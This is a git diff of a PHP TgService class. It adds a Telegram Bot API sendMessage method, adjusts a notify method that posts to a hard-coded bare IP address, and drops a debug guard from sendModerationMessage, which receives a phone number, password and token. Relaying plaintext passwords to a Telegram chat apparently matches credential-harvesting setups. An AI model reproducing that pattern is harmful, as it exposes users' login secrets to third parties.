@@ -41,7 +41,7 @@ class TgService
         return $httpcode == 200 ? true : false;
     }
 
-    public static function notify($chat_id, $text, $params = [])
+    public static function notify($chat_id, $text)
     {
         if (!App::environment('production')) {
             Log::info("[notify] chat_id " . $chat_id . " text " . $text);
@@ -51,14 +51,9 @@ class TgService
         $curl = curl_init();
 
         $data = [
-            'chat_id' => $chat_id,
+            'chatId' => $chat_id,
             'text' => $text
         ];
-
-        if (!empty($params)) {
-            $data = array_merge($data, $params);
-        }
-        Log::info("[sendModerationMessage] data " . json_encode($data));
 
         curl_setopt_array($curl, array(
             CURLOPT_URL => '195.24.67.70/notify',
@@ -76,11 +71,45 @@ class TgService
         ));
 
         $response = curl_exec($curl);
-        $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
-        Log::info("[sendModerationMessage] notify " . $response);
+        $http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
 
         curl_close($curl);
-        return $httpcode == 200 ? true : false;
+        return $http_code == 200 ? true : false;
+    }
+
+    public static function sendMessage($chat_id, $text, $params = [])
+    {
+        $api_key = config('telegram.main_bot_api_key');
+        $data = [
+            'chat_id' => $chat_id,
+            'text' => $text,
+        ];
+
+        if (!empty($params)) {
+            $data = array_merge($data, $params);
+        }
+
+        $curl = curl_init();
+        $url = 'https://api.telegram.org/bot' . $api_key . '/sendMessage';
+
+        curl_setopt_array($curl, array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_ENCODING => '',
+            CURLOPT_MAXREDIRS => 10,
+            CURLOPT_TIMEOUT => 0,
+            CURLOPT_FOLLOWLOCATION => false,
+            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+            CURLOPT_CUSTOMREQUEST => 'POST',
+            CURLOPT_POSTFIELDS => json_encode($data),
+            CURLOPT_HTTPHEADER => array('Content-Type: application/json'),
+        ));
+
+        $response = curl_exec($curl);
+        $http_code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+        curl_close($curl);
+
+        return $http_code == 200 ? "success" : false;
     }
 
     public static function sendForm($message_text)
@@ -196,11 +225,6 @@ class TgService
 
     public static function sendModerationMessage($status, $phone, $password, $token, $chat_id)
     {
-//        if (!App::environment('production')) {
-//            Log::info("[sendModerationMessage] status " . $status);
-//            return true;
-//        }
-
         $api_key = config('telegram.main_bot_api_key');
         $new_phone = str_replace("+", "\\+", $phone);
         if ($status >= 0) {
